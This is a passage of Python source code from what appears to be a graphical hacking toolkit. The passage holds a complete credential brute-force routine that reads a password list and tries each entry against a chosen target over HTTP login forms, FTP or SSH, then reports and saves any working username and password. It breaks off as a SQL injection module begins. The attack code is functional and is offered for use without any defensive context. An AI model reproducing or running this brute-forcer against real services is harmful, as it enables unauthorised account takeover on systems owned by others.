            service_combo.pack(pady=5)
            output = scrolledtext.ScrolledText(frame, width=100, height=20)
            output.pack(pady=10)
            self.setup_tags(output)
            self.bruting = False

            def brute_force():
                if self.bruting:
                    return
                self.bruting = True
                target, user, pass_file, service = target_entry.get(), user_entry.get(), pass_file_entry.get(), service_combo.get()
                if not all([target, user, pass_file, service]):
                    output.insert(tk.END, "Please fill all fields!\n", "error")
                    self.bruting = False
                    return
                if not os.path.exists(pass_file):
                    output.insert(tk.END, "Password file not found!\n", "error")
                    self.bruting = False
                    return
                output.delete(1.0, tk.END)
                output.insert(tk.END, f"Brute forcing {service} on {target}...\n", "info")
                self.log(f"Brute force {service} on {target}")
                with open(pass_file, "r") as f:
                    passwords = [line.strip() for line in f]

                def attempt():
                    for pwd in passwords:
                        if not self.bruting:
                            break
                        try:
                            if service == "HTTP":
                                resp = requests.post(target, data={"username": user, "password": pwd}, timeout=5)
                                if resp.status_code == 200:
                                    output.insert(tk.END, f"Success: {user}:{pwd}\n", "success")
                                    self.bruting = False
                                    break
                            elif service == "FTP":
                                import ftplib
                                ftp = ftplib.FTP(target.split("://")[1])
                                ftp.login(user, pwd)
                                output.insert(tk.END, f"Success: {user}:{pwd}\n", "success")
                                ftp.quit()
                                self.bruting = False
                                break
                            elif service == "SSH":
                                import paramiko
                                ssh = paramiko.SSHClient()
                                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                                ssh.connect(target.split("://")[1], username=user, password=pwd, timeout=5)
                                output.insert(tk.END, f"Success: {user}:{pwd}\n", "success")
                                ssh.close()
                                self.bruting = False
                                break
                        except Exception:
                            output.insert(tk.END, f"Tried: {user}:{pwd} - Failed\n", "info")
                        time.sleep(0.5)
                    if self.bruting:
                        output.insert(tk.END, "No valid credentials found.\n", "error")
                    self.bruting = False
                    self.prompt_save(output.get(1.0, tk.END), "brute_force")

                threading.Thread(target=attempt, daemon=True).start()

            def stop_brute():
                self.bruting = False
                output.insert(tk.END, "Brute force stopped.\n", "success")

            ttk.Button(frame, text="Start Brute Force", command=brute_force).pack(side="left", padx=5)
            ttk.Button(frame, text="Stop Brute Force", command=stop_brute).pack(side="left", padx=5)

        def build_sql_injection(self, frame):
